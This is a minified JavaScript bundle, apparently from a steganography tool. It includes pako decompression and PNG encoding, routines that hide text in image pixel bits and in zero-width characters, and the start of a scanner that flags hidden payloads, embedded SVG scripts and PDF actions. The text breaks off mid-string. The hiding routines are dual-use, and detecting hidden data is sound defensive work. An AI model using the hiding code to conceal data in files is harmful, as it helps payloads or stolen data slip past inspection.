d[f++]=1<<24|64<<16|0,d[f++]=1<<24|64<<16|0,y.bits=1,0;for(b=1;b<w&&K[b]===0;b++);for(T<b&&(T=b),q=1,m=1;m<=ql;m++)if(q<<=1,q-=K[m],q<0)return-1;if(q>0&&(l===Am||w!==1))return-1;for(te[1]=0,m=1;m<ql;m++)te[m+1]=te[m]+K[m];for(v=0;v<o;v++)c[r+v]!==0&&(g[te[c[r+v]]++]=v);if(l===Am?(X=le=g,ie=20):l===$u?(X=ax,le=nx,ie=257):(X=lx,le=ix,ie=0),ee=0,v=0,m=b,B=f,U=T,G=0,Q=-1,V=1<<T,he=V-1,l===$u&&V>wm||l===jm&&V>Em)return 1;for(;;){be=m-G,g[v]+1<ie?(Xe=0,_e=g[v]):g[v]>=ie?(Xe=le[g[v]-ie],_e=X[g[v]-ie]):(Xe=96,_e=0),W=1<<m-G,M=1<<U,b=M;do M-=W,d[B+(ee>>G)+M]=be<<24|Xe<<16|_e|0;while(M!==0);for(W=1<<m-1;ee&W;)W>>=1;if(W!==0?(ee&=W-1,ee+=W):ee=0,v++,--K[m]===0){if(m===w)break;m=c[r+g[v]]}if(m>T&&(ee&he)!==Q){for(G===0&&(G=T),B+=b,U=m-G,q=1<<U;U+G<w&&(q-=K[U+G],!(q<=0));)U++,q<<=1;if(V+=1<<U,l===$u&&V>wm||l===jm&&V>Em)return 1;Q=ee&he,d[Q]=T<<24|U<<16|B-f|0}}return ee!==0&&(d[B+ee]=m-G<<24|64<<16|0),y.bits=T,0};var Ji=rx;const sx=0,Mg=1,Hg=2,{Z_FINISH:Nm,Z_BLOCK:cx,Z_TREES:Ys,Z_OK:Kn,Z_STREAM_END:ox,Z_NEED_DICT:ux,Z_STREAM_ERROR:Qt,Z_DATA_ERROR:Bg,Z_MEM_ERROR:kg,Z_BUF_ERROR:fx,Z_DEFLATED:Cm}=ir,ac=16180,zm=16181,Om=16182,Rm=16183,Dm=16184,Um=16185,Mm=16186,Hm=16187,Bm=16188,km=16189,Fs=16190,Ma=16191,Wu=16192,Lm=16193,ef=16194,Gm=16195,qm=16196,Ym=16197,Zm=16198,Zs=16199,Xs=16200,Xm=16201,Vm=16202,Qm=16203,Km=16204,Im=16205,tf=16206,Fm=16207,Jm=16208,Le=16209,Lg=16210,Gg=16211,dx=852,hx=592,px=15,mx=px,Pm=l=>(l>>>24&255)+(l>>>8&65280)+((l&65280)<<8)+((l&255)<<24);function gx(){this.strm=null,this.mode=0,this.last=!1,this.wrap=0,this.havedict=!1,this.flags=0,this.dmax=0,this.check=0,this.total=0,this.head=null,this.wbits=0,this.wsize=0,this.whave=0,this.wnext=0,this.window=null,this.hold=0,this.bits=0,this.length=0,this.offset=0,this.extra=0,this.lencode=null,this.distcode=null,this.lenbits=0,this.distbits=0,this.ncode=0,this.nlen=0,this.ndist=0,this.have=0,this.next=null,this.lens=new Uint16Array(320),this.work=new Uint16Array(288),this.lendyn=null,this.distdyn=null,this.sane=0,this.back=0,this.was=0}const In=l=>{if(!l)return 1;const c=l.state;return!c||c.strm!==l||c.mode<ac||c.mode>Gg?1:0},qg=l=>{if(In(l))return Qt;const c=l.state;return l.total_in=l.total_out=c.total=0,l.msg="",c.wrap&&(l.adler=c.wrap&1),c.mode=ac,c.last=0,c.havedict=0,c.flags=-1,c.dmax=32768,c.head=null,c.hold=0,c.bits=0,c.lencode=c.lendyn=new Int32Array(dx),c.distcode=c.distdyn=new Int32Array(hx),c.sane=1,c.back=-1,Kn},Yg=l=>{if(In(l))return Qt;const c=l.state;return c.wsize=0,c.whave=0,c.wnext=0,qg(l)},Zg=(l,c)=>{let r;if(In(l))return Qt;const o=l.state;return c<0?(r=0,c=-c):(r=(c>>4)+5,c<48&&(c&=15)),c&&(c<8||c>15)?Qt:(o.window!==null&&o.wbits!==c&&(o.window=null),o.wrap=r,o.wbits=c,Yg(l))},Xg=(l,c)=>{if(!l)return Qt;const r=new gx;l.state=r,r.strm=l,r.window=null,r.mode=ac;const o=Zg(l,c);return o!==Kn&&(l.state=null),o},vx=l=>Xg(l,mx);let $m=!0,af,nf;const yx=l=>{if($m){af=new Int32Array(512),nf=new Int32Array(32);let c=0;for(;c<144;)l.lens[c++]=8;for(;c<256;)l.lens[c++]=9;for(;c<280;)l.lens[c++]=7;for(;c<288;)l.lens[c++]=8;for(Ji(Mg,l.lens,0,288,af,0,l.work,{bits:9}),c=0;c<32;)l.lens[c++]=5;Ji(Hg,l.lens,0,32,nf,0,l.work,{bits:5}),$m=!1}l.lencode=af,l.lenbits=9,l.distcode=nf,l.distbits=5},Vg=(l,c,r,o)=>{let d;const f=l.state;return f.window===null&&(f.window=new Uint8Array(1<<f.wbits)),f.wsize===0&&(f.wsize=1<<f.wbits,f.wnext=0,f.whave=0),o>=f.wsize?(f.window.set(c.subarray(r-f.wsize,r),0),f.wnext=0,f.whave=f.wsize):(d=f.wsize-f.wnext,d>o&&(d=o),f.window.set(c.subarray(r-o,r-o+d),f.wnext),o-=d,o?(f.window.set(c.subarray(r-o,r),0),f.wnext=o,f.whave=f.wsize):(f.wnext+=d,f.wnext===f.wsize&&(f.wnext=0),f.whave<f.wsize&&(f.whave+=d))),0},bx=(l,c)=>{let r,o,d,f,g,y,_,m,v,b,w,T,U,G,q=0,V,ee,W,M,Q,he,B,X;const ie=new Uint8Array(4);let K,te;const le=new Uint8Array([16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15]);if(In(l)||!l.output||!l.input&&l.avail_in!==0)return Qt;r=l.state,r.mode===Ma&&(r.mode=Wu),g=l.next_out,d=l.output,_=l.avail_out,f=l.next_in,o=l.input,y=l.avail_in,m=r.hold,v=r.bits,b=y,w=_,X=Kn;e:for(;;)switch(r.mode){case ac:if(r.wrap===0){r.mode=Wu;break}for(;v<16;){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}if(r.wrap&2&&m===35615){r.wbits===0&&(r.wbits=15),r.check=0,ie[0]=m&255,ie[1]=m>>>8&255,r.check=et(r.check,ie,2,0),m=0,v=0,r.mode=zm;break}if(r.head&&(r.head.done=!1),!(r.wrap&1)||(((m&255)<<8)+(m>>8))%31){l.msg="incorrect header check",r.mode=Le;break}if((m&15)!==Cm){l.msg="unknown compression method",r.mode=Le;break}if(m>>>=4,v-=4,B=(m&15)+8,r.wbits===0&&(r.wbits=B),B>15||B>r.wbits){l.msg="invalid window size",r.mode=Le;break}r.dmax=1<<r.wbits,r.flags=0,l.adler=r.check=1,r.mode=m&512?km:Ma,m=0,v=0;break;case zm:for(;v<16;){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}if(r.flags=m,(r.flags&255)!==Cm){l.msg="unknown compression method",r.mode=Le;break}if(r.flags&57344){l.msg="unknown header flags set",r.mode=Le;break}r.head&&(r.head.text=m>>8&1),r.flags&512&&r.wrap&4&&(ie[0]=m&255,ie[1]=m>>>8&255,r.check=et(r.check,ie,2,0)),m=0,v=0,r.mode=Om;case Om:for(;v<32;){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}r.head&&(r.head.time=m),r.flags&512&&r.wrap&4&&(ie[0]=m&255,ie[1]=m>>>8&255,ie[2]=m>>>16&255,ie[3]=m>>>24&255,r.check=et(r.check,ie,4,0)),m=0,v=0,r.mode=Rm;case Rm:for(;v<16;){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}r.head&&(r.head.xflags=m&255,r.head.os=m>>8),r.flags&512&&r.wrap&4&&(ie[0]=m&255,ie[1]=m>>>8&255,r.check=et(r.check,ie,2,0)),m=0,v=0,r.mode=Dm;case Dm:if(r.flags&1024){for(;v<16;){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}r.length=m,r.head&&(r.head.extra_len=m),r.flags&512&&r.wrap&4&&(ie[0]=m&255,ie[1]=m>>>8&255,r.check=et(r.check,ie,2,0)),m=0,v=0}else r.head&&(r.head.extra=null);r.mode=Um;case Um:if(r.flags&1024&&(T=r.length,T>y&&(T=y),T&&(r.head&&(B=r.head.extra_len-r.length,r.head.extra||(r.head.extra=new Uint8Array(r.head.extra_len)),r.head.extra.set(o.subarray(f,f+T),B)),r.flags&512&&r.wrap&4&&(r.check=et(r.check,o,T,f)),y-=T,f+=T,r.length-=T),r.length))break e;r.length=0,r.mode=Mm;case Mm:if(r.flags&2048){if(y===0)break e;T=0;do B=o[f+T++],r.head&&B&&r.length<65536&&(r.head.name+=String.fromCharCode(B));while(B&&T<y);if(r.flags&512&&r.wrap&4&&(r.check=et(r.check,o,T,f)),y-=T,f+=T,B)break e}else r.head&&(r.head.name=null);r.length=0,r.mode=Hm;case Hm:if(r.flags&4096){if(y===0)break e;T=0;do B=o[f+T++],r.head&&B&&r.length<65536&&(r.head.comment+=String.fromCharCode(B));while(B&&T<y);if(r.flags&512&&r.wrap&4&&(r.check=et(r.check,o,T,f)),y-=T,f+=T,B)break e}else r.head&&(r.head.comment=null);r.mode=Bm;case Bm:if(r.flags&512){for(;v<16;){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}if(r.wrap&4&&m!==(r.check&65535)){l.msg="header crc mismatch",r.mode=Le;break}m=0,v=0}r.head&&(r.head.hcrc=r.flags>>9&1,r.head.done=!0),l.adler=r.check=0,r.mode=Ma;break;case km:for(;v<32;){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}l.adler=r.check=Pm(m),m=0,v=0,r.mode=Fs;case Fs:if(r.havedict===0)return l.next_out=g,l.avail_out=_,l.next_in=f,l.avail_in=y,r.hold=m,r.bits=v,ux;l.adler=r.check=1,r.mode=Ma;case Ma:if(c===cx||c===Ys)break e;case Wu:if(r.last){m>>>=v&7,v-=v&7,r.mode=tf;break}for(;v<3;){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}switch(r.last=m&1,m>>>=1,v-=1,m&3){case 0:r.mode=Lm;break;case 1:if(yx(r),r.mode=Zs,c===Ys){m>>>=2,v-=2;break e}break;case 2:r.mode=qm;break;case 3:l.msg="invalid block type",r.mode=Le}m>>>=2,v-=2;break;case Lm:for(m>>>=v&7,v-=v&7;v<32;){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}if((m&65535)!==(m>>>16^65535)){l.msg="invalid stored block lengths",r.mode=Le;break}if(r.length=m&65535,m=0,v=0,r.mode=ef,c===Ys)break e;case ef:r.mode=Gm;case Gm:if(T=r.length,T){if(T>y&&(T=y),T>_&&(T=_),T===0)break e;d.set(o.subarray(f,f+T),g),y-=T,f+=T,_-=T,g+=T,r.length-=T;break}r.mode=Ma;break;case qm:for(;v<14;){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}if(r.nlen=(m&31)+257,m>>>=5,v-=5,r.ndist=(m&31)+1,m>>>=5,v-=5,r.ncode=(m&15)+4,m>>>=4,v-=4,r.nlen>286||r.ndist>30){l.msg="too many length or distance symbols",r.mode=Le;break}r.have=0,r.mode=Ym;case Ym:for(;r.have<r.ncode;){for(;v<3;){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}r.lens[le[r.have++]]=m&7,m>>>=3,v-=3}for(;r.have<19;)r.lens[le[r.have++]]=0;if(r.lencode=r.lendyn,r.lenbits=7,K={bits:r.lenbits},X=Ji(sx,r.lens,0,19,r.lencode,0,r.work,K),r.lenbits=K.bits,X){l.msg="invalid code lengths set",r.mode=Le;break}r.have=0,r.mode=Zm;case Zm:for(;r.have<r.nlen+r.ndist;){for(;q=r.lencode[m&(1<<r.lenbits)-1],V=q>>>24,ee=q>>>16&255,W=q&65535,!(V<=v);){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}if(W<16)m>>>=V,v-=V,r.lens[r.have++]=W;else{if(W===16){for(te=V+2;v<te;){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}if(m>>>=V,v-=V,r.have===0){l.msg="invalid bit length repeat",r.mode=Le;break}B=r.lens[r.have-1],T=3+(m&3),m>>>=2,v-=2}else if(W===17){for(te=V+3;v<te;){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}m>>>=V,v-=V,B=0,T=3+(m&7),m>>>=3,v-=3}else{for(te=V+7;v<te;){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}m>>>=V,v-=V,B=0,T=11+(m&127),m>>>=7,v-=7}if(r.have+T>r.nlen+r.ndist){l.msg="invalid bit length repeat",r.mode=Le;break}for(;T--;)r.lens[r.have++]=B}}if(r.mode===Le)break;if(r.lens[256]===0){l.msg="invalid code -- missing end-of-block",r.mode=Le;break}if(r.lenbits=9,K={bits:r.lenbits},X=Ji(Mg,r.lens,0,r.nlen,r.lencode,0,r.work,K),r.lenbits=K.bits,X){l.msg="invalid literal/lengths set",r.mode=Le;break}if(r.distbits=6,r.distcode=r.distdyn,K={bits:r.distbits},X=Ji(Hg,r.lens,r.nlen,r.ndist,r.distcode,0,r.work,K),r.distbits=K.bits,X){l.msg="invalid distances set",r.mode=Le;break}if(r.mode=Zs,c===Ys)break e;case Zs:r.mode=Xs;case Xs:if(y>=6&&_>=258){l.next_out=g,l.avail_out=_,l.next_in=f,l.avail_in=y,r.hold=m,r.bits=v,tx(l,w),g=l.next_out,d=l.output,_=l.avail_out,f=l.next_in,o=l.input,y=l.avail_in,m=r.hold,v=r.bits,r.mode===Ma&&(r.back=-1);break}for(r.back=0;q=r.lencode[m&(1<<r.lenbits)-1],V=q>>>24,ee=q>>>16&255,W=q&65535,!(V<=v);){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}if(ee&&(ee&240)===0){for(M=V,Q=ee,he=W;q=r.lencode[he+((m&(1<<M+Q)-1)>>M)],V=q>>>24,ee=q>>>16&255,W=q&65535,!(M+V<=v);){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}m>>>=M,v-=M,r.back+=M}if(m>>>=V,v-=V,r.back+=V,r.length=W,ee===0){r.mode=Im;break}if(ee&32){r.back=-1,r.mode=Ma;break}if(ee&64){l.msg="invalid literal/length code",r.mode=Le;break}r.extra=ee&15,r.mode=Xm;case Xm:if(r.extra){for(te=r.extra;v<te;){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}r.length+=m&(1<<r.extra)-1,m>>>=r.extra,v-=r.extra,r.back+=r.extra}r.was=r.length,r.mode=Vm;case Vm:for(;q=r.distcode[m&(1<<r.distbits)-1],V=q>>>24,ee=q>>>16&255,W=q&65535,!(V<=v);){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}if((ee&240)===0){for(M=V,Q=ee,he=W;q=r.distcode[he+((m&(1<<M+Q)-1)>>M)],V=q>>>24,ee=q>>>16&255,W=q&65535,!(M+V<=v);){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}m>>>=M,v-=M,r.back+=M}if(m>>>=V,v-=V,r.back+=V,ee&64){l.msg="invalid distance code",r.mode=Le;break}r.offset=W,r.extra=ee&15,r.mode=Qm;case Qm:if(r.extra){for(te=r.extra;v<te;){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}r.offset+=m&(1<<r.extra)-1,m>>>=r.extra,v-=r.extra,r.back+=r.extra}if(r.offset>r.dmax){l.msg="invalid distance too far back",r.mode=Le;break}r.mode=Km;case Km:if(_===0)break e;if(T=w-_,r.offset>T){if(T=r.offset-T,T>r.whave&&r.sane){l.msg="invalid distance too far back",r.mode=Le;break}T>r.wnext?(T-=r.wnext,U=r.wsize-T):U=r.wnext-T,T>r.length&&(T=r.length),G=r.window}else G=d,U=g-r.offset,T=r.length;T>_&&(T=_),_-=T,r.length-=T;do d[g++]=G[U++];while(--T);r.length===0&&(r.mode=Xs);break;case Im:if(_===0)break e;d[g++]=r.length,_--,r.mode=Xs;break;case tf:if(r.wrap){for(;v<32;){if(y===0)break e;y--,m|=o[f++]<<v,v+=8}if(w-=_,l.total_out+=w,r.total+=w,r.wrap&4&&w&&(l.adler=r.check=r.flags?et(r.check,d,w,g-w):tr(r.check,d,w,g-w)),w=_,r.wrap&4&&(r.flags?m:Pm(m))!==r.check){l.msg="incorrect data check",r.mode=Le;break}m=0,v=0}r.mode=Fm;case Fm:if(r.wrap&&r.flags){for(;v<32;){if(y===0)break e;y--,m+=o[f++]<<v,v+=8}if(r.wrap&4&&m!==(r.total&4294967295)){l.msg="incorrect length check",r.mode=Le;break}m=0,v=0}r.mode=Jm;case Jm:X=ox;break e;case Le:X=Bg;break e;case Lg:return kg;case Gg:default:return Qt}return l.next_out=g,l.avail_out=_,l.next_in=f,l.avail_in=y,r.hold=m,r.bits=v,(r.wsize||w!==l.avail_out&&r.mode<Le&&(r.mode<tf||c!==Nm))&&Vg(l,l.output,l.next_out,w-l.avail_out),b-=l.avail_in,w-=l.avail_out,l.total_in+=b,l.total_out+=w,r.total+=w,r.wrap&4&&w&&(l.adler=r.check=r.flags?et(r.check,d,w,l.next_out-w):tr(r.check,d,w,l.next_out-w)),l.data_type=r.bits+(r.last?64:0)+(r.mode===Ma?128:0)+(r.mode===Zs||r.mode===ef?256:0),(b===0&&w===0||c===Nm)&&X===Kn&&(X=fx),X},_x=l=>{if(In(l))return Qt;let c=l.state;return c.window&&(c.window=null),l.state=null,Kn},xx=(l,c)=>{if(In(l))return Qt;const r=l.state;return(r.wrap&2)===0?Qt:(r.head=c,c.done=!1,Kn)},Sx=(l,c)=>{const r=c.length;let o,d,f;return In(l)||(o=l.state,o.wrap!==0&&o.mode!==Fs)?Qt:o.mode===Fs&&(d=1,d=tr(d,c,r,0),d!==o.check)?Bg:(f=Vg(l,c,r,r),f?(o.mode=Lg,kg):(o.havedict=1,Kn))};var Tx=Yg,wx=Zg,Ex=qg,Ax=vx,jx=Xg,Nx=bx,Cx=_x,zx=xx,Ox=Sx,Rx="pako inflate (from Nodeca project)",pa={inflateReset:Tx,inflateReset2:wx,inflateResetKeep:Ex,inflateInit:Ax,inflateInit2:jx,inflate:Nx,inflateEnd:Cx,inflateGetHeader:zx,inflateSetDictionary:Ox,inflateInfo:Rx};function Dx(){this.text=0,this.time=0,this.xflags=0,this.os=0,this.extra=null,this.extra_len=0,this.name="",this.comment="",this.hcrc=0,this.done=!1}var Ux=Dx;const Qg=Object.prototype.toString,{Z_NO_FLUSH:Mx,Z_FINISH:Wm,Z_OK:Zl,Z_STREAM_END:lf,Z_NEED_DICT:rf,Z_STREAM_ERROR:Hx,Z_DATA_ERROR:eg,Z_MEM_ERROR:Bx,Z_BUF_ERROR:tg}=ir,kx={chunkSize:1024*64,windowBits:15,to:""};function cr(l){this.options=tc.assign({},kx,l||{});const c=this.options;c.raw&&c.windowBits>=0&&c.windowBits<16&&(c.windowBits=-c.windowBits,c.windowBits===0&&(c.windowBits=-15)),c.windowBits>=0&&c.windowBits<16&&!(l&&l.windowBits)&&(c.windowBits+=32),c.windowBits>15&&c.windowBits<48&&(c.windowBits&15)===0&&(c.windowBits|=15),this.err=0,this.msg="",this.ended=!1,this.chunks=[],this.strm=new Dg,this.strm.avail_out=0;let r=pa.inflateInit2(this.strm,c.windowBits);if(r!==Zl)throw new Error(Xn[r]);if(this.header=new Ux,pa.inflateGetHeader(this.strm,this.header),c.dictionary&&(typeof c.dictionary=="string"?c.dictionary=nr.string2buf(c.dictionary):Qg.call(c.dictionary)==="[object ArrayBuffer]"&&(c.dictionary=new Uint8Array(c.dictionary)),c.raw&&(r=pa.inflateSetDictionary(this.strm,c.dictionary),r!==Zl)))throw new Error(Xn[r])}cr.prototype.push=function(l,c){const r=this.strm,o=this.options.chunkSize,d=this.options.dictionary;let f,g,y;if(this.ended)return!1;for(c===~~c?g=c:g=c===!0?Wm:Mx,Qg.call(l)==="[object ArrayBuffer]"?r.input=new Uint8Array(l):r.input=l,r.next_in=0,r.avail_in=r.input.length;;){for(r.avail_out===0&&(r.output=new Uint8Array(o),r.next_out=0,r.avail_out=o),f=pa.inflate(r,g),f===rf&&d&&(f=pa.inflateSetDictionary(r,d),f===Zl?f=pa.inflate(r,g):f===eg&&(f=rf));r.avail_in>0&&f===lf&&r.state.wrap&2&&r.state.flags!==0&&r.input[r.next_in]!==0;)pa.inflateReset(r),f=pa.inflate(r,g);switch(f){case Hx:case eg:case rf:case Bx:return this.onEnd(f),this.ended=!0,!1}if(y=r.avail_out,r.next_out&&(r.avail_out===0||f===lf||g>0))if(this.options.to==="string"){let _=nr.utf8border(r.output,r.next_out),m=r.next_out-_,v=nr.buf2string(r.output,_);r.next_out=m,r.avail_out=o-m,m&&r.output.set(r.output.subarray(_,_+m),0),this.onData(v)}else this.onData(r.output.length===r.next_out?r.output:r.output.subarray(0,r.next_out)),r.avail_out=0,r.next_out=0;if(!((f===Zl||f===tg)&&y===0)){if(f===lf)return f=pa.inflateEnd(this.strm),this.onEnd(f),this.ended=!0,!0;if(r.avail_in===0){if(g===Wm)return f=pa.inflateEnd(this.strm),this.onEnd(f===Zl?tg:f),this.ended=!0,!1;break}}}return!0};cr.prototype.onData=function(l){this.chunks.push(l)};cr.prototype.onEnd=function(l){l===Zl&&(this.options.to==="string"?this.result=this.chunks.join(""):this.result=tc.flattenChunks(this.chunks)),this.chunks=[],this.err=l,this.msg=this.strm.msg};function Cf(l,c){const r=new cr(c);if(r.push(l,!0),r.err)throw r.msg||Xn[r.err];return r.result}function Lx(l,c){return c=c||{},c.raw=!0,Cf(l,c)}var Gx=cr,qx=Cf,Yx=Lx,Zx=Cf,Xx={Inflate:Gx,inflate:qx,inflateRaw:Yx,ungzip:Zx};const{Deflate:Vx,deflate:Qx,deflateRaw:Kx,gzip:Ix}=W_,{Inflate:Fx,inflate:Jx,inflateRaw:Px,ungzip:$x}=Xx;var Wx=Vx,eS=Qx,tS=Kx,aS=Ix,nS=Fx,lS=Jx,iS=Px,rS=$x,sS=ir,Kg={Deflate:Wx,deflate:eS,deflateRaw:tS,gzip:aS,Inflate:nS,inflate:lS,inflateRaw:iS,ungzip:rS,constants:sS};function sf(l,c){const r=new Uint8Array(12+c.length),o=new DataView(r.buffer);o.setUint32(0,c.length),r.set(new TextEncoder().encode(l),4),r.set(c,8);let d=-1;for(let f=4;f<8+c.length;f++){d^=r[f];for(let g=0;g<8;g++)d=d&1?d>>>1^3988292384:d>>>1}return o.setUint32(8+c.length,~d>>>0),r}function cS(l){const c=new Uint8Array(13),r=new DataView(c.buffer);r.setUint32(0,l.w),r.setUint32(4,l.h),c[8]=8,c[9]=6;const o=new Uint8Array(l.h*(1+l.w*4));for(let g=0;g<l.h;g++)o[g*(1+l.w*4)]=0,o.set(l.rgba.subarray(g*l.w*4,(g+1)*l.w*4),g*(1+l.w*4)+1);const d=new Uint8Array(Kg.deflate(o,{level:6})),f=new Uint8Array([137,80,78,71,13,10,26,10]);return oS(f,sf("IHDR",c),sf("IDAT",d),sf("IEND",new Uint8Array(0)))}function Ig(l){try{if(l[0]!==137||l[1]!==80)return null;let c=8,r=0,o=0,d=[];for(;c+8<=l.length;){const m=l[c]<<24|l[c+1]<<16|l[c+2]<<8|l[c+3],v=String.fromCharCode(l[c+4],l[c+5],l[c+6],l[c+7]),b=l.subarray(c+8,c+8+m);if(v==="IHDR")r=b[0]<<24|b[1]<<16|b[2]<<8|b[3],o=b[4]<<24|b[5]<<16|b[6]<<8|b[7];else if(v==="IDAT")d.push(new Uint8Array(b));else if(v==="IEND")break;c+=12+m}if(!r||!o||!d.length)return null;const f=Kg.inflate(Fg(d)),g=1+r*4,y=new Uint8Array(r*o*4);let _=new Uint8Array(r*4);for(let m=0;m<o;m++){const v=f[m*g],b=new Uint8Array(f.subarray(m*g+1,m*g+g));if(v!==0)if(v===1)for(let w=4;w<b.length;w++)b[w]=b[w]+b[w-4]&255;else if(v===2)for(let w=0;w<b.length;w++)b[w]=b[w]+_[w]&255;else if(v===3)for(let w=0;w<b.length;w++)b[w]=b[w]+((w>=4?b[w-4]:0)+_[w])>>1&255;else return null;y.set(b,m*r*4),_=b}return{w:r,h:o,rgba:y}}catch{return null}}function oS(...l){return Fg(l)}function Fg(l){const c=l.reduce((d,f)=>d+f.length,0),r=new Uint8Array(c);let o=0;for(const d of l)r.set(d,o),o+=d.length;return r}function uS(l){const r={w:96,h:96,rgba:new Uint8Array(36864)},o=[233,230,216],d=[217,54,40],f=[16,21,23],g=[103,104,82],y=[0,1,0,0,0,1,0,0,1,2,1,0,0,1,2,1,1,2,0,1,1,0,2,1,1,2,0,1,1,0,2,1,1,2,0,0,0,0,2,1,1,2,0,0,0,0,2,1,1,2,0,0,0,0,2,1,0,0,0,0,0,0,0,0];for(let _=0;_<96;_++)for(let m=0;m<96;m++){const v=(_*96+m)*4;let b=o;_>=60&&_<66?b=d:_>=70&&_<76&&m>=8&&m<88&&(b=m<44?f:g);const w=Math.floor(m/96*8),T=Math.floor(_/32*8);if(_<52){const U=y[T*8+w];b=U===1?[16,21,23]:U===2?d:o}r.rgba[v]=b[0],r.rgba[v+1]=b[1],r.rgba[v+2]=b[2],r.rgba[v+3]=255}return fS(r,l),r}function fS(l,c){const r=new TextEncoder().encode(c),o=[];for(const d of[...xf,r.length>>8&255,r.length&255,...r])for(let f=7;f>=0;f--)o.push(d>>f&1);for(let d=0;d<o.length&&!(d*4>=l.rgba.length);d++)l.rgba[d*4]=l.rgba[d*4]&254|o[d];return o.length}function Jg(l){const c=[];for(let r=0;r<l.rgba.length;r+=4)c.push(l.rgba[r]&1);return c}function dS(l){const c=Ig(l);return c?fg(Jg(c)):null}const Js="​",Ps="‌";function hS(l,c){const r=new TextEncoder().encode(c),o=[...l],d=Math.min(r.length,o.length);let f="";for(let g=0;g<d;g++){const y=r[g];for(let _=7;_>=0;_--)f+=y>>_&1?Ps:Js;f+=o[g]}return f+o.slice(d).join("")}function pS(l){let c=l.length;for(;c>0&&(l[c-1]<32||l[c-1]>126);)c--;if(!c)return null;try{return new TextDecoder().decode(new Uint8Array(l.slice(0,c)))}catch{return null}}function mS(l){const c=[];for(const f of l)f===Js?c.push(0):f===Ps&&c.push(1);const r=Math.floor(c.length/8),o=[];for(let f=0;f<r;f++){let g=0;for(let y=0;y<8;y++)g=g<<1|c[f*8+y];o.push(g)}return{clean:[...l].filter(f=>f!==Js&&f!==Ps).join(""),payload:o.length?pS(o):null}}function gS(l){let c=0;for(const o of l)if(o===Js||o===Ps||o==="‍"||o==="⁠")c++;else{const d=o.codePointAt(0);d>=917504&&d<=917631&&c++}const r=mS(l);return{count:c,payload:r.payload}}function vS(l){const c=o=>[...l.subarray(0,o)].map(d=>String.fromCharCode(d)).join("");if(l[0]===137&&l[1]===80&&l[2]===78&&l[3]===71)return"png";if(l[0]===0&&l[1]===0&&l[2]===1&&l[3]===0)return"ico";if(c(6)==="GIF87a"||c(6)==="GIF89a")return"gif";if(c(2)==="PK")return"zip";if(c(4)==="%PDF")return"pdf";if(c(4)==="wOF2")return"woff2";if(c(4)==="RIFF")return"wav/riff";if(c(3)==="ID3")return"mp3";const r=c(256).toLowerCase();return r.includes("<svg")?"svg":r.startsWith("<?xml")?"xml":r.startsWith("<!doctype")||r.startsWith("<html")?"html":"text/binary"}function yS(l){if(!l.length)return 0;const c=new Uint32Array(256);for(const o of l)c[o]++;let r=0;for(const o of c)if(o){const d=o/l.length;r-=d*Math.log2(d)}return r}function Vs(l){if(!l.length)return{chi2:0,p:"n/a"};const c=l.reduce((f,g)=>f+g,0),r=l.length,o=(c-(r-c))**2/r,d=o<3.84?"p>0.05":o<6.63?"p<0.05":o<10.83?"p<0.01":"p<0.001";return{chi2:o,p:d}}function ag(l){const c=new Uint8Array(Math.ceil(l.length/8));for(let r=0;r<l.length;r++)l[r]&&(c[r>>3]|=128>>(r&7));return c}const bS=[{id:"magic",name:"magic-bytes"},{id:"trailing",name:"trailing-data"},{id:"ico-alpha-lsb",name:"alpha-lsb (ico)"},{id:"png-red-lsb",name:"red-lsb (png)"},{id:"zero-width",name:"zero-width (txt)"},{id:"zip-walk",name:"zip-walk"},{id:"woff2-tables",name:"woff2-tables"},{id:"svg-scripts",name:"svg-scripts"},{id:"pdf-actions",name:"pdf-actions"},{id:"exif",name:"exif"},{id:"id3",name:"id3"},{id:"entropy",name:"entropy"}];function _S(l,c){const r=vS(l),o=[];let d="clean",f=1,g,y;if(o.push({id:"magic",name:"magic-bytes",status:"clean",note:`format: ${r}`}),r==="ico")try{const m=Ws(l),v=m.find(b=>b.w===48)??m[m.length-1];if(v){const b=ug(v),w=d1(l);if(y={plane:"alpha",w:v.w,h:v.h,bits:of(ag(b))},w!==null){const T=48+w.length*8,U=Vs(b.slice(T));o.push({id:"ico-alpha-lsb",name:"alpha-LSB (ico)",status:"flag",note:`sync header MF47 at alpha plane · ${w.length} B payload · tail χ²=${U.chi2.toFixed(1)} (${U.p})`}),g=w,d="stego-carrier — alpha-LSB payload",f=5}else{const T=Vs(b);o.push({id:"ico-alpha-lsb",name:"alpha-LSB (ico)",status:"clean",note:`no sync header · alpha last-bit ${T.p} (χ²=${T.chi2.toFixed(1)})`})}}}catch{o.push({id:"ico-alpha-lsb",name:"alpha-lsb (ico)",status:"na",note:"decode failed"})}else o.push({id:"ico-alpha-lsb",name:"alpha-lsb (ico)",status:"na",note:"not an ico"});if(r==="png"){const m=Ig(l);if(m){const v=Jg(m),b=dS(l);if(y={plane:"red",w:m.w,h:m.h,bits:of(ag(v))},b!==null){const w=48+b.length*8,T=Vs(v.slice(w));o.push({id:"png-red-lsb",name:"red-lsb (png)",status:"flag",note:`sync header MF47 at red plane · ${b.length} B payload · tail χ²=${T.chi2.toFixed(1)} (${T.p})`}),g=b,d="stego-carrier — red-plane LSB payload",f=5}else{const w=Vs(v);o.push({id:"png-red-lsb",name:"red-lsb (png)",status:"clean",note:`no sync header · red last-bit ${w.p} (χ²=${w.chi2.toFixed(1)})`})}}else o.push({id:"png-red-lsb",name:"red-lsb (png)",status:"na",note:"decode failed"})}else o.push({id:"png-red-lsb",name:"red-lsb (png)",status:"na",note:"not a 